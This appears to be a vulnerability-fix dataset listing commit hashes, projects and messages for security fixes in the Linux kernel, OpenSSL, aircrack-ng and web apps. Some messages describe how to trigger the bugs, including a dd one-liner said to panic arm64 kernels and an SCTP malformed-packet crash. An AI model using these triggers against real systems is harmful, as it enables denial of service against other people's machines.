    google-calendar-events/includes/misc-functions.php
Blob(s) In Commit: 
    d7c50983ac7b3ebb812c3bd9eab9922ba9ff4b1a
Blob(s) Before Fix: 
    e27017cc9ce5f9f2e636818b7abb8ae0e82856fa
    ee5dbd1313142931b9b690ee02cd304dec83e5f3
Projects:
    foria_WP-Google-Calendar-Events
Commit Message for a701ceeb410bdda9d96c9d3d12104630df5d5b43:
Added esc_html to ajax post values

======================================================================
Commit With Fix: 
    18f39e7be0121317550d03e267e3ebd4dbfbb3ce
File(s) In Commit: 
    fs/cifs/smb2pdu.c
Blob(s) In Commit: 
    240c627bc0c6619a55423428eec4c7b941365acf
Blob(s) Before Fix: 
    2013234b73adc47a5a34cb907ce0b818f65a16f5
    3802f8c94accdba8e9d62622155a523a2c39b4d4
    41d9d0725f0f3a47d432aa754803a4596c0381ac
    42ebc1a8be6cb241c5ee77e1944f063ae15a472d
    74440af59f3554d75afefd0f265ded355077ef31
    b0b260dbb19dff021ad124fbad81322f51b8b69e
    f144d6f3c9be092d20b3010118e99933ebe8c2a6
Projects:
    0-T-0_ps4-linux
Commit Message for 18f39e7be0121317550d03e267e3ebd4dbfbb3ce:
[CIFS] Possible null ptr deref in SMB2_tcon\n\nAs Raphael Geissert pointed out, tcon_error_exit can dereference tcon and there is one path in which tcon can be null.\n\nSigned-off-by: Steve French <smfrench@gmail.com> CC: Stable <stable@vger.kernel.org> # v3.7+ Reported-by: Raphael Geissert <geissert@debian.org>

======================================================================
Commit With Fix: 
    b751602d8cb7194ee62a61e085069679525138c4
File(s) In Commit: 
    lib/batch.js
Blob(s) In Commit: 
    e0cbabf2afd798c0dd3ae2434a669c916c249f43
Blob(s) Before Fix: 
    fe98963d02e0d50aaa8fc37c8975bbc091ab4ce7
Projects:
    2fast2fourier_bassmaster
Commit Message for b751602d8cb7194ee62a61e085069679525138c4:
Remove eval statement

======================================================================
Commit With Fix: 
    43d1b6b266363ae7545d5d49851034eaeec7bebb
File(s) In Commit: 
    admin/themes/default/pages/manage_users.twig
Blob(s) In Commit: 
    6dca45cbd307b24c654953ba7d3197091c7bcab7
Blob(s) Before Fix: 
    9711c4b3923cb1fef5ab6e4326b7175c7a327e5a
    e63e2a95388323ce602407a98f0e9ad66c1a6f6f
Projects:
    12345j_chyrp
Commit Message for 43d1b6b266363ae7545d5d49851034eaeec7bebb:
Fixed a potential XSS vulnerability.\n\nThanks JPCERT for reporting it to us.

======================================================================
Commit With Fix: 
    c88547a8119e3b581318ab65e9b72f27f23e641d
File(s) In Commit: 
    fs/xfs/xfs_da_btree.c
Blob(s) In Commit: 
    e69d57be866b7a86b589f4b3e0f1bc405a6419ec
Blob(s) Before Fix: 
    0b8b2a13cd24debe493c8982679a2c565ebae5a1
    20bf8e8002d6fd2733782af97f373ddaf2bcd8d6
    4d7696a024184459209d2386f15fa92a42540b98
    6102ac6d1dffb99adf41f7ad9171b618e0ab3ae7
    77c74257c2a3b7e631f9ebfa6e25f6b1f3bcf46d
    796272a2e1298fca3a5cc08ef4c6b226d6eec15c
    79ddbaf9320626319e2c278433e5825f6f925bbc
    eca6f9d8a26301697e1995845de0184204ce9c25
Projects:
    0-T-0_ps4-linux
Commit Message for c88547a8119e3b581318ab65e9b72f27f23e641d:
xfs: fix directory hash ordering bug\n\nCommit f5ea1100 ("xfs: add CRCs to dir2/da node blocks") introduced in 3.10 incorrectly converted the btree hash index array pointer in xfs_da3_fixhashpath(). It resulted in the the current hash always being compared against the first entry in the btree rather than the current block index into the btree block's hash entry array. As a result, it was comparing the wrong hashes, and so could misorder the entries in the btree.\n\nFor most cases, this doesn't cause any problems as it requires hash collisions to expose the ordering problem. However, when there are hash collisions within a directory there is a very good probability that the entries will be ordered incorrectly and that actually matters when duplicate hashes are placed into or removed from the btree block hash entry array.\n\nThis bug results in an on-disk directory corruption and that results in directory verifier functions throwing corruption warnings into the logs. While no data or directory entries are lost, access to them may be compromised, and attempts to remove entries from a directory that has suffered from this corruption may result in a filesystem shutdown.  xfs_repair will fix the directory hash ordering without data loss occuring.\n\n[dchinner: wrote useful a commit message]\n\ncc: <stable@vger.kernel.org> Reported-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: Mark Tinguely <tinguely@sgi.com> Reviewed-by: Ben Myers <bpm@sgi.com> Signed-off-by: Dave Chinner <david@fromorbit.com>

======================================================================
Commit With Fix: 
    086ba77a6db00ed858ff07451bedee197df868c9
File(s) In Commit: 
    kernel/trace/trace_syscalls.c
Blob(s) In Commit: 
    29228c4d569692ea4234d880d13e94233b3e32f4
Blob(s) Before Fix: 
    301bc8cfea28d44c1be370c3617e16efba1d8999
    322e16461072575e6d8439208891b5730bd41438
    4dc8b79c5f75d214919220bdc45232fe635e6af0
    5097a8ed55f7ef46438e5aded578196c6ccb4613
    559329d9bd2fa4d9dd22f2ce31b4dcba6b5f1119
    6b245f64c8dd850bbbd7a16132d997fccd25206e
    759d5e004517cab413188b9a4a1b3adf9e6b2597
    7609dd6714c2acc1a8862a47fbb014ef4f50e1c2
    7a809e3210583a77f5eb8e8a64ce1cb6552e7f6f
    7d567a4b9fa7b1cb6930c165b86f79a136b09e17
    7e3cd7aaec837b49c78d96a5566d32456d287aa6
    8f2ac73c7a5fd9a6c8412b7b96e1cc0473651d62
    8fd03657bc7d1f684279c46681519e16a1812f87
    902391b90a22fada103544984c10ac0cd3fdc4dd
    a7f7b616910136856c1091fddc15a4a679541f02
    bdb9ee0af99192e74bdd3507b2a2cada010e57de
    cb654542c1a1621fc325cba70699f8b2d1be9658
    fe3a2e4ae23218fc8314579e60f7c9e78a73e56d
Projects:
    0-T-0_ps4-linux
Commit Message for 086ba77a6db00ed858ff07451bedee197df868c9:
tracing/syscalls: Ignore numbers outside NR_syscalls' range\n\nARM has some private syscalls (for example, set_tls(2)) which lie outside the range of NR_syscalls.  If any of these are called while syscall tracing is being performed, out-of-bounds array access will occur in the ftrace and perf sys_{enter,exit} handlers.\n\n # trace-cmd record -e raw_syscalls:* true && trace-cmd report  ...  true-653   [000]   384.675777: sys_enter:            NR 192 (0, 1000, 3, 4000022, ffffffff, 0)  true-653   [000]   384.675812: sys_exit:             NR 192 = 1995915264  true-653   [000]   384.675971: sys_enter:            NR 983045 (76f74480, 76f74000, 76f74b28, 76f74480, 76f76f74, 1)  true-653   [000]   384.675988: sys_exit:             NR 983045 = 0  ...\n\n # trace-cmd record -e syscalls:* true  [   17.289329] Unable to handle kernel paging request at virtual address aaaaaace  [   17.289590] pgd = 9e71c000  [   17.289696] [aaaaaace] *pgd=00000000  [   17.289985] Internal error: Oops: 5 [#1] PREEMPT SMP ARM  [   17.290169] Modules linked in:  [   17.290391] CPU: 0 PID: 704 Comm: true Not tainted 3.18.0-rc2+ #21  [   17.290585] task: 9f4dab00 ti: 9e710000 task.ti: 9e710000  [   17.290747] PC is at ftrace_syscall_enter+0x48/0x1f8  [   17.290866] LR is at syscall_trace_enter+0x124/0x184\n\nFix this by ignoring out-of-NR_syscalls-bounds syscall numbers.\n\nCommit cd0980fc8add "tracing: Check invalid syscall nr while tracing syscalls" added the check for less than zero, but it should have also checked for greater than NR_syscalls.\n\nLink: http://lkml.kernel.org/p/1414620418-29472-1-git-send-email-rabin@rab.in\n\nFixes: cd0980fc8add "tracing: Check invalid syscall nr while tracing syscalls" Cc: stable@vger.kernel.org # 2.6.33+ Signed-off-by: Rabin Vincent <rabin@rab.in> Signed-off-by: Steven Rostedt <rostedt@goodmis.org>

======================================================================
Commit With Fix: 
    086ba77a6db00ed858ff07451bedee197df868c9
File(s) In Commit: 
    kernel/trace/trace_syscalls.c
Blob(s) In Commit: 
    29228c4d569692ea4234d880d13e94233b3e32f4
Blob(s) Before Fix: 
    301bc8cfea28d44c1be370c3617e16efba1d8999
    322e16461072575e6d8439208891b5730bd41438
    4dc8b79c5f75d214919220bdc45232fe635e6af0
    5097a8ed55f7ef46438e5aded578196c6ccb4613
    559329d9bd2fa4d9dd22f2ce31b4dcba6b5f1119
    6b245f64c8dd850bbbd7a16132d997fccd25206e
    759d5e004517cab413188b9a4a1b3adf9e6b2597
    7609dd6714c2acc1a8862a47fbb014ef4f50e1c2
    7a809e3210583a77f5eb8e8a64ce1cb6552e7f6f
    7d567a4b9fa7b1cb6930c165b86f79a136b09e17
    7e3cd7aaec837b49c78d96a5566d32456d287aa6
    8f2ac73c7a5fd9a6c8412b7b96e1cc0473651d62
    8fd03657bc7d1f684279c46681519e16a1812f87
    902391b90a22fada103544984c10ac0cd3fdc4dd
    a7f7b616910136856c1091fddc15a4a679541f02
    bdb9ee0af99192e74bdd3507b2a2cada010e57de
    cb654542c1a1621fc325cba70699f8b2d1be9658
    fe3a2e4ae23218fc8314579e60f7c9e78a73e56d
Projects:
    0-T-0_ps4-linux
Commit Message for 086ba77a6db00ed858ff07451bedee197df868c9:
tracing/syscalls: Ignore numbers outside NR_syscalls' range\n\nARM has some private syscalls (for example, set_tls(2)) which lie outside the range of NR_syscalls.  If any of these are called while syscall tracing is being performed, out-of-bounds array access will occur in the ftrace and perf sys_{enter,exit} handlers.\n\n # trace-cmd record -e raw_syscalls:* true && trace-cmd report  ...  true-653   [000]   384.675777: sys_enter:            NR 192 (0, 1000, 3, 4000022, ffffffff, 0)  true-653   [000]   384.675812: sys_exit:             NR 192 = 1995915264  true-653   [000]   384.675971: sys_enter:            NR 983045 (76f74480, 76f74000, 76f74b28, 76f74480, 76f76f74, 1)  true-653   [000]   384.675988: sys_exit:             NR 983045 = 0  ...\n\n # trace-cmd record -e syscalls:* true  [   17.289329] Unable to handle kernel paging request at virtual address aaaaaace  [   17.289590] pgd = 9e71c000  [   17.289696] [aaaaaace] *pgd=00000000  [   17.289985] Internal error: Oops: 5 [#1] PREEMPT SMP ARM  [   17.290169] Modules linked in:  [   17.290391] CPU: 0 PID: 704 Comm: true Not tainted 3.18.0-rc2+ #21  [   17.290585] task: 9f4dab00 ti: 9e710000 task.ti: 9e710000  [   17.290747] PC is at ftrace_syscall_enter+0x48/0x1f8  [   17.290866] LR is at syscall_trace_enter+0x124/0x184\n\nFix this by ignoring out-of-NR_syscalls-bounds syscall numbers.\n\nCommit cd0980fc8add "tracing: Check invalid syscall nr while tracing syscalls" added the check for less than zero, but it should have also checked for greater than NR_syscalls.\n\nLink: http://lkml.kernel.org/p/1414620418-29472-1-git-send-email-rabin@rab.in\n\nFixes: cd0980fc8add "tracing: Check invalid syscall nr while tracing syscalls" Cc: stable@vger.kernel.org # 2.6.33+ Signed-off-by: Rabin Vincent <rabin@rab.in> Signed-off-by: Steven Rostedt <rostedt@goodmis.org>

======================================================================
Commit With Fix: 
    e40607cbe270a9e8360907cb1e62ddf0736e4864
File(s) In Commit: 
    net/sctp/sm_make_chunk.c
Blob(s) In Commit: 
    9f32741abb1c7b142265297dc2fac78b74b3d195
Blob(s) Before Fix: 
    0121e0ab035167d468c2976f17f210b2cb98a083
    362ae6e2fd93a6e145fefb15e5f6e5cf4579204b
    371a152d97599eb08cec8f75d626cd2f59a936af
    3a1767ef3201a6a1870f641ef29e3683ea6dcff7
    43abb643f3a141909aac2504809687a11be26b0a
    479a70ef6ff8abe2a59a16ddc672f6638c7b3369
    87e244be899a78dd076cf1b4e7b1301c748df8d9
    a85eeeb55dd0022e009895c53a6d8593929b7691
    ab734be8cb209864910f2fd667f2a6a27266f3af
    ae0e616a7ca5ed64ee9e7e09cab08a13caf7bff7
    cf579e71cff0652cd2fea2d7aae8c8343ecc66f7
    d244a23ab8d33c95e0b8133e212c35bc4a47875a
    df06b13a50f6f686fc49b6718da9a140e141b0bb
    e706a11ed158aa49ae1bd516badc5571a92619a9
    fee5552ddf929e40f702e1d0b86ead2cb0630f97
Projects:
    0-T-0_ps4-linux
Commit Message for e40607cbe270a9e8360907cb1e62ddf0736e4864:
net: sctp: fix NULL pointer dereference in af->from_addr_param on malformed packet\n\nAn SCTP server doing ASCONF will panic on malformed INIT ping-of-death in the form of:\n\n  ------------ INIT[PARAM: SET_PRIMARY_IP] ------------>\n\nWhile the INIT chunk parameter verification dissects through many things in order to detect malformed input, it misses to actually check parameters inside of parameters. E.g. RFC5061, section 4.2.4 proposes a 'set primary IP address' parameter in ASCONF, which has as a subparameter an address parameter.\n\nSo an attacker may send a parameter type other than SCTP_PARAM_IPV4_ADDRESS or SCTP_PARAM_IPV6_ADDRESS, param_type2af() will subsequently return 0 and thus sctp_get_af_specific() returns NULL, too, which we then happily dereference unconditionally through af->from_addr_param().\n\nThe trace for the log:\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000078 IP: [<ffffffffa01e9c62>] sctp_process_init+0x492/0x990 [sctp] PGD 0 Oops: 0000 [#1] SMP [...] Pid: 0, comm: swapper Not tainted 2.6.32-504.el6.x86_64 #1 Bochs Bochs RIP: 0010:[<ffffffffa01e9c62>]  [<ffffffffa01e9c62>] sctp_process_init+0x492/0x990 [sctp] [...] Call Trace:  <IRQ>  [<ffffffffa01f2add>] ? sctp_bind_addr_copy+0x5d/0xe0 [sctp]  [<ffffffffa01e1fcb>] sctp_sf_do_5_1B_init+0x21b/0x340 [sctp]  [<ffffffffa01e3751>] sctp_do_sm+0x71/0x1210 [sctp]  [<ffffffffa01e5c09>] ? sctp_endpoint_lookup_assoc+0xc9/0xf0 [sctp]  [<ffffffffa01e61f6>] sctp_endpoint_bh_rcv+0x116/0x230 [sctp]  [<ffffffffa01ee986>] sctp_inq_push+0x56/0x80 [sctp]  [<ffffffffa01fcc42>] sctp_rcv+0x982/0xa10 [sctp]  [<ffffffffa01d5123>] ? ipt_local_in_hook+0x23/0x28 [iptable_filter]  [<ffffffff8148bdc9>] ? nf_iterate+0x69/0xb0  [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff8148bf86>] ? nf_hook_slow+0x76/0x120  [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0 [...]\n\nA minimal way to address this is to check for NULL as we do on all other such occasions where we know sctp_get_af_specific() could possibly return with NULL.\n\nFixes: d6de3097592b ("[SCTP]: Add the handling of "Set Primary IP Address" parameter to INIT") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a2b9e6c1a35afcc0973acb72e591c714e78885ff
File(s) In Commit: 
    arch/x86/kvm/x86.c
Blob(s) In Commit: 
    e46da50e2cec51d56cbff2199c93a8656798e5cd
Blob(s) Before Fix: 
    2d7f65daa8d0983538c9fe6d577fcc06937e76c8
Projects:
    0-T-0_ps4-linux
Commit Message for a2b9e6c1a35afcc0973acb72e591c714e78885ff:
KVM: x86: Don't report guest userspace emulation error to userspace\n\nCommit fc3a9157d314 ("KVM: X86: Don't report L2 emulation failures to user-space") disabled the reporting of L2 (nested guest) emulation failures to userspace due to race-condition between a vmexit and the instruction emulator. The same rational applies also to userspace applications that are permitted by the guest OS to access MMIO area or perform PIO.\n\nThis patch extends the current behavior - of injecting a #UD instead of reporting it to userspace - also for guest userspace code.\n\nSigned-off-by: Nadav Amit <namit@cs.technion.ac.il> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    97fc15436b36ee3956efad83e22a557991f7d19d
File(s) In Commit: 
    arch/arm64/lib/clear_user.S
Blob(s) In Commit: 
    c17967fdf5f6007330ba65beb7a05bd347600764
Blob(s) Before Fix: 
    07c7ad97ee281b1edb2a320d031a174bc65627a7
    21ba0b29621b2fab087aa8adaeb15e0d589966ac
    3c4d8a3a1eb8fd64582f96299e331941c4d70b0d
    5899e18f255d77f4f5ea9bc42dc26aeb996cfafc
    5d1cad3ce6d601aa474ae9c9b8ef4c76a785912e
    5ed63cc8693a2f92f8c1b49ba90863d680a38054
    6e0ed93d51fe1850ee27176fc9222dac5416b74d
    a9723c71c52b20adf4e2efe69b2e43163cb2c878
    d7150e30438aef3bb3f29a8a41a73fbd4c5d4157
    e88fb99c15616397e6c4bbc0dd9c26e504688d97
Projects:
    0-T-0_ps4-linux
Commit Message for 97fc15436b36ee3956efad83e22a557991f7d19d:
arm64: __clear_user: handle exceptions on strb\n\nARM64 currently doesn't fix up faults on the single-byte (strb) case of __clear_user... which means that we can cause a nasty kernel panic as an ordinary user with any multiple PAGE_SIZE+1 read from /dev/zero. i.e.: dd if=/dev/zero of=foo ibs=1 count=1 (or ibs=65537, etc.)\n\nThis is a pretty obscure bug in the general case since we'll only __do_kernel_fault (since there's no extable entry for pc) if the mmap_sem is contended. However, with CONFIG_DEBUG_VM enabled, we'll always fault.\n\nif (!down_read_trylock(&mm->mmap_sem)) { 	if (!user_mode(regs) && !search_exception_tables(regs->pc)) 		goto no_context  retry: 	down_read(&mm->mmap_sem)  } else { 	/* 	 * The above down_read_trylock() might have succeeded in 	 * which 	 * case, we'll have missed the might_sleep() from 	 * down_read(). 	 */ 	might_sleep()  	if (!user_mode(regs) && !search_exception_tables(regs->pc)) 		goto no_context  }\n\nFix that by adding an extable entry for the strb instruction, since it touches user memory, similar to the other stores in __clear_user.\n\nSigned-off-by: Kyle McMartin <kyle@redhat.com> Reported-by: Miloš Prchlík <mprchlik@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Catalin Marinas <catalin.marinas@arm.com>

======================================================================
Commit With Fix: 
    41bdc78544b8a93a9c6814b8bbbfef966272abbe
File(s) In Commit: 
    arch/x86/kernel/tls.c
Blob(s) In Commit: 
    e7650bd71109af8819e9cb2c7479a2162353f917
Blob(s) Before Fix: 
    f7fec09e3e3a83c9fec36dfe2f0c75906b8c23c1
Projects:
    0-T-0_ps4-linux
Commit Message for 41bdc78544b8a93a9c6814b8bbbfef966272abbe:
x86/tls: Validate TLS entries to protect espfix\n\nInstalling a 16-bit RW data segment into the GDT defeats espfix. AFAICT this will not affect glibc, Wine, or dosemu at all.\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net> Acked-by: H. Peter Anvin <hpa@zytor.com> Cc: stable@vger.kernel.org Cc: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: security@kernel.org <security@kernel.org> Cc: Willy Tarreau <w@1wt.eu> Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    db29a9508a9246e77087c5531e45b2c88ec6988b
File(s) In Commit: 
    net/netfilter/nf_conntrack_proto_generic.c
Blob(s) In Commit: 
    957c1db6665254645f43d0c04456015a1d4df65c
Blob(s) Before Fix: 
    2281be419a74b6d8abe0fd7da8d7e8b35d304600
    698614d449dd9b0283bfbea4580127d141c8131c
    702d423513ab7d2d42ca61f9450e7c8deaf07fd7
    835e24c58f0de3ab67977aad017d456a840e28ce
    86dc752e534963b08c7fc4217db533c480042d17
    8c35c14604caa9273ee2866711cbcf17d7830766
    b82575d916b8e09fd56e1553776069521cbedd41
    c3ad706170878bfed64bbbe7bab9a828c4f30d39
    d25f293776482f5e88c831c290058f2ca2e6af2b
    d5868bad33a7ef1fd85e4dfffe024041d048d00a
    e2091d0c7a2fb7b232d606a3f6940b1150e4cfb8
    f8ee91bc98075e4750df9fc1149bde93d9c1ea40
Projects:
    0-T-0_ps4-linux
Commit Message for db29a9508a9246e77087c5531e45b2c88ec6988b:
netfilter: conntrack: disable generic tracking for known protocols\n\nGiven following iptables ruleset:\n\n-P FORWARD DROP -A FORWARD -m sctp --dport 9 -j ACCEPT -A FORWARD -p tcp --dport 80 -j ACCEPT -A FORWARD -p tcp -m conntrack -m state ESTABLISHED,RELATED -j ACCEPT\n\nOne would assume that this allows SCTP on port 9 and TCP on port 80. Unfortunately, if the SCTP conntrack module is not loaded, this allows *all* SCTP communication, to pass though, i.e. -p sctp -j ACCEPT, which we think is a security issue.\n\nThis is because on the first SCTP packet on port 9, we create a dummy "generic l4" conntrack entry without any port information (since conntrack doesn't know how to extract this information).\n\nAll subsequent packets that are unknown will then be in established state since they will fallback to proto_generic and will match the 'generic' entry.\n\nOur originally proposed version [1] completely disabled generic protocol tracking, but Jozsef suggests to not track protocols for which a more suitable helper is available, hence we now mitigate the issue for in tree known ct protocol helpers only, so that at least NAT and direction information will still be preserved for others.\n\n [1] http://www.spinics.net/lists/netfilter-devel/msg33430.html\n\nJoint work with Daniel Borkmann.\n\nSigned-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Acked-by: Jozsef Kadlecsik <kadlec@blackhole.kfki.hu> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    ee53664bda169f519ce3c6a22d378f0b946c8178
File(s) In Commit: 
    include/asm-generic/pgtable.h
Blob(s) In Commit: 
    db09234589409760b91cb9e696472a3e828476f9
Blob(s) Before Fix: 
    0807ddf97b058fb04b1eedfd82c34b76e4253335
    125c54e985170440a7ccd99f41fc35b922be150c
    2f47ade1b5678f325faea455656a9578839b8638
    a59ff51b016695f54095e753cbfc2a5a6b684684
    b12079afbd5f2757440a054e984dcd9f9e1b1547
    b36ce40bd1c6c929e8b408044440df4ce5931825
    b58268a5ddd4319f6552e7800b3df1bacf96aa81
    bfd87685fc1fd1fa32ea231c563205ed6f448a14
    dd6d9b89d338bb4fa7afe117d51e738480ffa6b6
    f330d28e4d0eaf4d8e681bb905f52ff72465bea7
    ff4947b7a9762b6ea414aa8b0159af8abb90e9dc
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for ee53664bda169f519ce3c6a22d378f0b946c8178:
mm: Fix NULL pointer dereference in madvise(MADV_WILLNEED) support\n\nSasha Levin found a NULL pointer dereference that is due to a missing page table lock, which in turn is due to the pmd entry in question being a transparent huge-table entry.\n\nThe code - introduced in commit 1998cc048901 ("mm: make madvise(MADV_WILLNEED) support swap file prefetch") - correctly checks for this situation using pmd_none_or_trans_huge_or_clear_bad(), but it turns out that that function doesn't work correctly.\n\npmd_none_or_trans_huge_or_clear_bad() expected that pmd_bad() would trigger if the transparent hugepage bit was set, but it doesn't do that if pmd_numa() is also set. Note that the NUMA bit only gets set on real NUMA machines, so people trying to reproduce this on most normal development systems would never actually trigger this.\n\nFix it by removing the very subtle (and subtly incorrect) expectation, and instead just checking pmd_trans_huge() explicitly.\n\nReported-by: Sasha Levin <sasha.levin@oracle.com> Acked-by: Andrea Arcangeli <aarcange@redhat.com> [ Additionally remove the now stale test for pmd_trans_huge() inside the   pmd_bad() case - Linus ] Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    470990fee0182566d439ef7e82d1abf18b7085d7
File(s) In Commit: 
    ssl/d1_lib.c
Blob(s) In Commit: 
    7d9d91ff2c34bc7af74acd3437578ce91abed5b8
Blob(s) Before Fix: 
    106939f24177b7c727c2ddc4a3344df16d19b14f
    2287ba6fa42ddffda61ac53051311394318474db
    2b066e01651e396715c1730ac4561db9148c362c
Projects:
    0902710055_openssl
Commit Message for 470990fee0182566d439ef7e82d1abf18b7085d7:
Free up s->d1->buffered_app_data.q properly.\n\nPR#3286

======================================================================
Commit With Fix: 
    ff70494dd389ba570dbdbf36f217c28d4381c6b5
File(s) In Commit: 
    src/airodump-ng.c
Blob(s) In Commit: 
    222492c0d04dc02e748687ae2b4d4cdd2a78bf5d
Blob(s) Before Fix: 
    4620d22bafc20d33979f25c744c7c2733bd780de
    6cec91269ecbf5eb84c697d2c0a49a5f4de3d93e
Projects:
    0x0mar_aircrack-ng
Commit Message for ff70494dd389ba570dbdbf36f217c28d4381c6b5:
Airodump-ng: Fixed GPS stack overflow (Closes #13 on GitHub).\n\ngit-svn-id: http://svn.aircrack-ng.org/trunk@2416 28c6078b-6c39-48e3-add9-af49d547ecab

======================================================================
Commit With Fix: 
    091b153f294b9b695b0b2831e65936438b550d7b
File(s) In Commit: 
    src/aireplay-ng.c
Blob(s) In Commit: 
    b3970151267cc15d58e722a251a6a54b507836eb
Blob(s) Before Fix: 
    733544256287ee97b6a5bd01b2f6b9b21b482d09
Projects:
    0x0mar_aircrack-ng
Commit Message for 091b153f294b9b695b0b2831e65936438b550d7b:
Aireplay-ng: Fixed tcp_test stack overflow (Closes #14 on GitHub).\n\ngit-svn-id: http://svn.aircrack-ng.org/trunk@2417 28c6078b-6c39-48e3-add9-af49d547ecab

======================================================================
Commit With Fix: 
    da087238963c1239fdabd47dc1b65279605aca70
File(s) In Commit: 
    src/buddy-ng.c
Blob(s) In Commit: 
    8da8996d402bf1674bc79c25ff4e07378f81c8df
Blob(s) Before Fix: 
    8a7927c773b6ffd76f039505366dbfd1287f3948
Projects:
    0x0mar_aircrack-ng
Commit Message for da087238963c1239fdabd47dc1b65279605aca70:
Buddy-ng: Fixed segmentation fault (Closes #15 on GitHub).\n\ngit-svn-id: http://svn.aircrack-ng.org/trunk@2418 28c6078b-6c39-48e3-add9-af49d547ecab

======================================================================
Commit With Fix: 
    88702a3ce4c28a973bf69023cd0312f412f6193e
File(s) In Commit: 
    src/osdep/network.c
Blob(s) In Commit: 
    4ebfaf414a2dd4742c59cc2c2d1de1f99bb1d4f9
Blob(s) Before Fix: 
    4f0f8b23383fcc5ee9005c8dbe3f236f361ec7ce
Projects:
    0x0mar_aircrack-ng
Commit Message for 88702a3ce4c28a973bf69023cd0312f412f6193e:
OSdep: Fixed segmentation fault that happens with a malicious server sending a negative length (Closes #16 on GitHub).\n\ngit-svn-id: http://svn.aircrack-ng.org/trunk@2419 28c6078b-6c39-48e3-add9-af49d547ecab

======================================================================
Commit With Fix: 
    3d32e4dbe71374a6780eaf51d719d76f9a9bf22f
File(s) In Commit: 
    virt/kvm/iommu.c
Blob(s) In Commit: 
    c1e6ae989a432165f9d6871626929ed2ecb578e8
Blob(s) Before Fix: 
    0df7d4b34dfec96345d359bf08562309d8607f40
    1f0dc1e5f1f0f60c2debe5e274faa485ce11f58d
    2612fa4281bd03a8fe863e962426b400cffba9f6
    45ee080573f454e62fb5deb1cb4f6dd9d1077f38
    4a340cb230134bd7fb15b62545ff8b5245ecbfa2
    714b949323120aee855dd7e57db549cac31e8183
    72a130bc448aa97adb1ca35a2dfff09a102b717d
    a195c07fa8290b44cb435f5ac06d841507e33503
    a457d2138f49ac8ed860507de8c9068566368889
    a650aa48c78691722b59d5a5b78d9e43c349421d
    e51d9f9b995f1864faa6921a41cc0809ce69fb8a
    e723bb91aa346a3bbc0805e064a3823838d2a7c1
    e9fff9830bf0bf6f2229603516ebdd633996fd20
Projects:
    0-T-0_ps4-linux
Commit Message for 3d32e4dbe71374a6780eaf51d719d76f9a9bf22f:
kvm: fix excessive pages un-pinning in kvm_iommu_map error path.\n\nThe third parameter of kvm_unpin_pages() when called from kvm_iommu_map_pages() is wrong, it should be the number of pages to un-pin and not the page size.\n\nThis error was facilitated with an inconsistent API: kvm_pin_pages() takes a size, but kvn_unpin_pages() takes a number of pages, so fix the problem by matching the two.\n\nThis was introduced by commit 350b8bd ("kvm: iommu: fix the third parameter of kvm_iommu_put_pages (CVE-2014-3601)"), which fixes the lack of un-pinning for pages intended to be un-pinned (i.e. memory leak) but unfortunately potentially aggravated the number of pages we un-pin that should have stayed pinned. As far as I understand though, the same practical mitigations apply.\n\nThis issue was found during review of Red Hat 6.6 patches to prepare Ksplice rebootless updates.\n\nThanks to Vegard for his time on a late Friday evening to help me in understanding this code.\n\nFixes: 350b8bd ("kvm: iommu: fix the third parameter of... (CVE-2014-3601)") Cc: stable@vger.kernel.org Signed-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com> Signed-off-by: Vegard Nossum <vegard.nossum@oracle.com> Signed-off-by: Jamie Iles <jamie.iles@oracle.com> Reviewed-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    d2e91c118f6128875274a638007702d1cc665893
File(s) In Commit: 
    data/org.freedesktop.systemd1.conf
Blob(s) In Commit: 
    a07a8e1ce3191c087c700540dc48738d8cce3a61
Blob(s) Before Fix: 
    201afe65bef5a320ec18b2b9f91b404bf4f8bc4b
    a17aea090a29b86a1d5ce3aba9276361dbade403
    c6ce6178d33fc6f8aa8170fceb9b53e2c661a917
Projects:
    desrt_systemd-shim
Commit Message for d2e91c118f6128875274a638007702d1cc665893:
security policy: remove clause for Abandon call\n\nI committed this after copying it out of a work-in-progress branch that was being worked on by Serge.  I didn't realise that it was most likely only ever intended to be for debugging purposes.\n\nAccording to Martin and Stéphane this is not needed and is a potential security problem.  Let's close that hole.

======================================================================
Commit With Fix: 
    3f6f1480d86bf9fc16c160d803ab1d006e3058d5
File(s) In Commit: 
    arch/x86/kvm/emulate.c
Blob(s) In Commit: 
    749f9fa3825422adb9a3cc9a5867f52ec256dedd
Blob(s) Before Fix: 
    03954f7900f522a496d8249174ec63cc760aa140
    205b17eed93c2bfa0d402414a29bac9ed4fb3e5f
    2bc1e81045b0f20f90ad2500c3acae318de1e8ee
    56657b0bb3bb14f14b76fdcd99a746598ce5e8b4
    97da5034d81262e41d74f8d7785f0a084c60b13d
    a46207a0583508ad662d179f2db1ede320a7645e
    e4e833d3d7d7bb826907f7053d56c1c45748e476
Projects:
    0-T-0_ps4-linux
Commit Message for 3f6f1480d86bf9fc16c160d803ab1d006e3058d5:
